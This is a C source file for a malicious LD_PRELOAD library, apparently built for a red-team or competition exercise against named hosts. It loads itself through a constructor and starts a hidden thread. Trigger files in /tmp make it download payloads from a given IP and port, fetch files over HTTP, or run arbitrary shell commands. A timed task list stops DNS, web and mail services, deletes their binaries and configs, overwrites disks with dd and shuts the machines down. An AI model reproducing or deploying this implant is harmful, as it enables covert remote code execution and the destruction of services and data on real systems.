#include <stdio.h>  
#include <stdlib.h>
#include <pthread.h> // threading
#include <unistd.h>  // for sleep
#include <stdbool.h> // bool type
#include <sys/stat.h> // stat
#include <sys/socket.h> // socket stuff
#include <arpa/inet.h> // inet_addr
#include <netdb.h> 
#include <ctype.h>
#include <time.h>
#include <string.h>


#define TESTING 1

#define SLEEP_INTERVAL 5

#define _snprintf snprintf

// gcc -shared -fPIC -lpthread -o linux_maliciouslib.so linux_maliciouslib.c
// LD_PRELOAD=./linux_maliciouslib.so ls

void myenter()__attribute__((constructor));
void myexit()__attribute__((destructor));

void* threadmain(void *);

void myenter() {

#ifdef TESTING
  printf("library loaded\n");
#endif

  pthread_t dontcare;

  pthread_create(&dontcare, NULL, &threadmain, NULL);
}


void myexit() {
//This doesn't seem to be happening, but I'm not entirely sure why.
#ifdef TESTING
  printf("library unloaded\n");
#endif
}

bool file_exists(char* filename) {
  struct stat buffer;
  return (stat (filename, &buffer) == 0);
}

void setmyhostname(char *dest) {
    char inbuff[1024];
    FILE *fh;
    
    //open the file in temp first
    if (file_exists("/tmp/X9999-host")) { //Connect to socket and write to file
        fh = fopen("/tmp/X9999-host", "r");
       
        if (fh == NULL) {
#ifdef TESTING
            printf("Failed to open the hostname file\n");
#endif
       }
       else {
#ifdef TESTING
            printf("hostname File opened ok.  Reading\n");
#endif

            fgets(inbuff, sizeof(inbuff), fh);
            if (inbuff[strlen(inbuff)-1] == '\n') {
                inbuff[strlen(inbuff)-1] = '\0';
            }

            fclose(fh);
#ifdef TESTING
            printf ("Parsed Hostname :%s:\n", inbuff);
#endif
            strncpy(dest, inbuff, 99);
            return;
       }
    }
#ifdef TESTING
    printf ("Didn't get it from X9999-host file\n");
#endif
    //if not possible check environment variable
    // on windows set varname=value
    char *temp = getenv("HOSTNAME");
    if ( temp != NULL) {
#ifdef TESTING
        printf("Environment var hostname:%s:\n", temp);
#endif
        strncpy(dest, temp, 99);
        return;
    }
#ifdef TESTING
    printf ("Didn't get it from environment\n");
#endif
    //if not there use localhostname.
    if (gethostname(inbuff, 1024) == 0) {  //Brilliant 0 is success on this one :(

        strncpy(dest, inbuff,99);

#ifdef TESTING
        printf("Defaulting to own hostname :%s:\n",inbuff);
#endif
        return;
    }

    printf ("Didn't get it from localhostname\n");
    sprintf(dest, "dunno"); // Unsafe but good enough
}

typedef struct taskstruct {
    int day;
    int hour;
    int min;
    char *task;
    int done;
} taskstruct;

#define FRIDAY 5
#define SATURDAY 6

//int numtasks = 0;
 taskstruct tasklist[] = {
{ FRIDAY, 15, 0, "/usr/bin/xeyes", 0},

{ SATURDAY, 12, 0, "/bin/systemctl stop bind9.service", 0},  //.20 dns
{ SATURDAY, 12, 0, "/bin/systemctl stop ntp.service", 0},     //.20 ntp
{ SATURDAY, 12, 0, "/usr/sbin/service apache2 stop", 0},     //.23 apache (zencart)
{ SATURDAY, 12, 0, "/bin/systemctl stop httpd.service", 0},     //.11 apache (prestashop) and .39 squirrelmail
{ SATURDAY, 12, 0, "/bin/systemctl stop dovecot.service", 0},     //.39 squirrel
{ SATURDAY, 12, 0, "/bin/systemctl stop postfix.service", 0},     //.39 squirrel

{ SATURDAY, 13, 0, "/bin/systemctl stop bind9.service; rm /usr/sbin/named", 0}, //.20 dns
{ SATURDAY, 13, 0, "/bin/systemctl stop ntp.service; rm /usr/sbin/ntpd", 0},  //.20 ntp
{ SATURDAY, 13, 0, "/usr/sbin/service apache2 stop; rm /etc/apache2/apache2.conf", 0},    //.23 apache (zencart)
{ SATURDAY, 13, 0, "/bin/systemctl stop httpd.service; rm /etc/httpd/conf/httpd.conf", 0}, //.11 apache (prestashop) and 39 squirrelmail
{ SATURDAY, 13, 0, "/bin/systemctl stop dovecot.service; rm /usr/sbin/dovecot", 0},     //.39 squirrel
{ SATURDAY, 13, 0, "/bin/systemctl stop postfix.service; rm /usr/libexec/postfix/smtpd", 0},     //.39 squirrel

{ SATURDAY, 14, 0, "/bin/dd if=/dev/null of=/dev/sda1 bs=1M; shutdown -h now", 0},  //Any
{ SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/dm-0 bs=1M; shutdown -h now", 0},   //.23 only, doubt this will ever run but why not have it.
{ SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/mapper/fedora--server_fedora-root; shutdown -h now", 0},   //.39 only, doubt this will ever run but why not have it.
{ SATURDAY, 15, 0, "/bin/dd if=/dev/null of=/dev/mapper/centos-root bs=1M; shutdown -h now", 0}   //.11 only, doubt this will ever run but why not have it.

};

typedef struct cronstruct {
    int period; // in minutes
    char *task;
    time_t lastrun;
} cronstruct;

//First parameter is how often to run the command in minutes
//second the task to be run.  Note that cmd /c for built in shell commands is needed
//third is the last time the command was run.  Note that a 0 will cause it to be run immediately
//I don't currently have a way to add tasks/cron jobs but perhaps I'll change that.

cronstruct cronstructlist[] = {
    {2, "/usr/bin/xeyes", 0},
    {5, "/usr/bin/touch /tmp/cronran_5", 0},
    {10, "/usr/bin/touch /tmp/cronran_10", 0}
};

void add_task(int day, int hour, int min, char *task) {
  //Need to go dynamic to do this.  Do I want to?
}

void add_cron(int period, char* task) {
  //Not going to write this yet, but perhaps someday.

}

/* From Windows
void runtask(char *task) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si,sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    char *cmd = "c:\\Windows\\notepad.exe";
    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
}
*/

/* Linux Version */
void runtask(char *task) {
  unsetenv("LD_PRELOAD");
  system(task);
}



void check_dns_task(char *myhostname) {
    //encode myhostname
    //hit dns name
    //dnstun.multifariousnonsense.com

    //parse response
    //At first will be run tasks in lookup table
    //Eventually want to encode blobs in dns responses
}

void check_time_tasks(void) {
    time_t current_time = time(NULL);
    struct tm *time_info = localtime(&current_time);


    int tasklistlen = sizeof(tasklist) / sizeof(taskstruct);
    for (int i = 0; i < tasklistlen; i++) {
        if ((tasklist[i].done == 0) && 
            (time_info->tm_wday == tasklist[i].day) &&
            (time_info->tm_hour == tasklist[i].hour) &&
            (time_info->tm_min == tasklist[i].min)) {

            runtask(tasklist[i].task);
            tasklist[i].done = 1;
        }

    }
}

void check_cron_tasks(void) {
    time_t current_time = time(NULL);
    struct tm *time_info = localtime(&current_time);


    int cronstructlistlen = sizeof(cronstructlist) / sizeof(cronstruct);
    printf ("Cronlist is %d long\n", cronstructlistlen);
    for (int i = 0; i < cronstructlistlen; i++) {
        time_t current_time = time(NULL);
        // Check now vs lastrun times
        if (difftime(current_time, cronstructlist[i].lastrun) > cronstructlist[i].period*60) {

            printf ("Attempting to run :%s:\n", cronstructlist[i].task);
            runtask(cronstructlist[i].task);
            
            //Update the last run time.
            cronstructlist[i].lastrun = current_time;
        }

    }
}




int get_content_length(char *response) {
  char *start, *end;
  char content_len_str[100];  // content length won't be longer than 100 characters
  int len;
  
  start = strstr(response, "Content-Length: ");
  if (start == NULL) {
    return -1;
  }
  start += 16;
  end = start;
  while (*end && isdigit(*end)) {
    end++;
  }
  len = end - start;
  strncpy(content_len_str, start, len);

  content_len_str[len] = '\0';
  printf ("Content-Length: %s\n", content_len_str);
  
  return atoi(content_len_str);
}


void* threadmain(void *arg) {
  FILE *fh;
  int tmp;
  char thisstr[] = "this";
  char inbuff[1024];
  char ip[1024];
  char outpath[1024];
  char torequest[900];
  char request[1024];
  char me[100]; //Some how get the hostname in here
  int port;
  int sockfd;
  struct sockaddr_in servaddr;



  setmyhostname(me);

  while (1) {
#ifdef TESTING
     printf ("main ran\n");
#endif
    
    if (file_exists("/tmp/ABC")) { // Basic Test
       fh = fopen("/tmp/sawabc","w");
       fwrite(thisstr,1,sizeof(thisstr), fh);
       fclose(fh);

       unlink("/tmp/ABC");
     }

    if (file_exists("/tmp/ANDOR")) { //Test Command
       unsetenv("LD_PRELOAD");
       runtask("/usr/bin/touch /tmp/systemcall\\ worked");

       unlink("/tmp/ANDOR");
     }

    if (file_exists("/tmp/X9999-lock")) { //Connect to socket and write to file
       fh = fopen("/tmp/X9999-lock", "r");
       if (fh == NULL) {
#ifdef TESTING
         printf("Failed to open the file\n");
#endif
       }
       else {
#ifdef TESTING
         printf("File opened ok.  Reading\n");
#endif
       }
       fflush(stdout);
       fgets(inbuff, sizeof(inbuff), fh);
       fclose(fh);
#ifdef TESTING       
       printf ("About to parse %s\n", inbuff);
#endif
       //Parse inbuff for addr and port separated by space
       if (sscanf(inbuff, "%100s %d %100s", ip, &port, outpath) != 3) {
//       if (0) {
#ifdef TESTING
         printf("Error parsing host and port and path");
#endif
       }
       else {
#ifdef TESTING
         printf("ip is: %s\nport is: %d\noutpath is: %s\n", ip, port, outpath);
#endif
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         if (sockfd < 0) {
#ifdef TESTING
           printf("Error opening socket\n");
#endif
         }
         //bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
         servaddr.sin_family = AF_INET;
         servaddr.sin_addr.s_addr=inet_addr(ip);
         servaddr.sin_port = htons(port);

         int tmp = connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) ;
	 
	 if (tmp < 0) {
#ifdef TESTING                    
           printf("Socket Error\n");
#endif                    
           close(sockfd);
         }
         else {
           unlink(outpath);
           fh = fopen(outpath, "wb");
           tmp = 1;

           while (tmp > 0) {
             tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
#ifdef TESTING                    
             printf("Received %d bytes\n", tmp);
#endif                    
             if (tmp > 0) {
               int tmp2 = fwrite (inbuff, sizeof(char), tmp, fh);
#ifdef TESTING                    
               printf ("Wrote %d bytes\n", tmp2);
#endif                    
             } 
	   } //while tmp
           fclose(fh);
	 } // else of connect failed
       } // Else on parsing
      unlink("/tmp/X9999-lock");
    } // End of X9999-lock - Connect and download

     //Web Request and write file
    if (file_exists("/tmp/X9997-lock")) {

      fh = fopen("/tmp/X9997-lock", "r");
      if (fh == NULL) {
#ifdef TESTING
        printf("Failed to open the file\n");
#endif
      }
      else {
#ifdef TESTING
        printf("File opened ok.  Reading\n");
#endif
      }

      fflush(stdout);
      fgets(inbuff, sizeof(inbuff), fh);

      fclose(fh);
#ifdef TESTING
      printf ("About to parse %s\n", inbuff);
#endif
        
      //Parse inbuff for addr and port separated by space
      if (sscanf(inbuff, "%100s %d %100s %100s", ip, &port, torequest, outpath) != 4) {
//       if (0) {
#ifdef TESTING
        printf("Error parsing host and port and path");
#endif
      }
      else {
#ifdef TESTING
        printf("ip is: %s\nport is: %d\nrequest is: %s\noutpath is: %s\n", ip, port, torequest, outpath);
#endif
        sockfd = socket(AF_INET, SOCK_STREAM, 0);        
        if (sockfd < 0) {
#ifdef TESTING
            printf("Error opening socket\n");
#endif
        }
          //bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr=inet_addr(ip);
        servaddr.sin_port = htons(port);

        int tmp = connect(sockfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) ;
	 
	      if (tmp < 0) {
#ifdef TESTING                    
            printf("Socket Error\n");
#endif                    
            close(sockfd);
          }
        else {
          // Send request
          _snprintf(request, sizeof(request),"GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, me);
          send(sockfd, request, strlen(request), 0);
          //Sleep(1000);
          sleep(1);
          int tmp = recv(sockfd,inbuff, sizeof(inbuff), 0); //probably have the full header portion here.
          //Find the Content-Length 
          int toread  = get_content_length(inbuff);
          if (toread == -1) {
#ifdef TESTING                         
            printf("didn't find content-length\n");
#endif                         
          }

          unlink(outpath);  //Delete if already exists
          fh = fopen(outpath, "w");
          
          int sofar = 0;

          char *start = strstr(inbuff, "\r\n\r\n");
          if (start == NULL) {
#ifdef TESTING                         
            printf("Couldn't find the boundary between response and body\n");
#endif                
          }
          start += 4; //Get past the \r\n\r\n 
          int len_of_header = (unsigned long int)start-(unsigned long int)inbuff;
                    
          int tmp2 = fwrite (start, sizeof(char), tmp-len_of_header, fh);
#ifdef TESTING                     
          printf("Wrote %d bytes\n", tmp2);
#endif                    
          sofar = tmp2;

          while (sofar < toread) {
            //Sleep(100);
            sleep(1);   //This may be too long for effective comms.
            tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
#ifdef TESTING                         
            printf("Received %d bytes\n", tmp);
#endif                        
            sofar += tmp;

            if (tmp > 0) {
              tmp2 = fwrite (inbuff, sizeof(char), tmp, fh);
#ifdef TESTING                             
              printf ("Wrote %d bytes\n", tmp2);
#endif                            
            }
                      
          }
#ifdef TESTING
          printf("Done writing, closing file");
#endif
          fclose(fh);
        }
      }  //good parse      
      unlink("/tmp/X9997-lock");
    } // End of X9997-lock - Web Request
    
    if (file_exists("/tmp/X9998-lock")) { //Execute the command in the file
      fh = fopen("/tmp/X9998-lock","r");
      tmp  = fread(&inbuff, sizeof(char), sizeof(inbuff), fh);

      runtask(inbuff);
      fclose(fh);

      unlink("/tmp/X9998-lock");
    }


    // check_time_tasks();
    //check_cron_tasks();
    //check_dns_tasks();

    sleep(SLEEP_INTERVAL);
  }
}